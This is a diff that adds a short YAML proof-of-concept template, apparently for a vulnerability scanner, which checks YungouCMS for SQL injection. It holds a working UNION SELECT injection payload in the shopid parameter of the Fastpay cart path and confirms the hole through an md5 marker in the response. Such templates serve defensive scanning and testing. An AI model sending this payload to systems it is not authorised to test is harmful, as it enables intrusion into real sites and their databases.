@@ -1,0 +1,14 @@
+name: poc-yaml-yungoucms-sqli
+set:
+  rand: randomInt(2000000000, 2100000000)
+rules:
+  - method: GET
+    path: >-
+      /?/member/cart/Fastpay&shopid=-1%20union%20select%20md5({{rand}}),2,3,4%20--+
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: cc_ci(https://github.com/cc8ci)
+  links:
+    - https://www.secquan.org/Prime/1069179
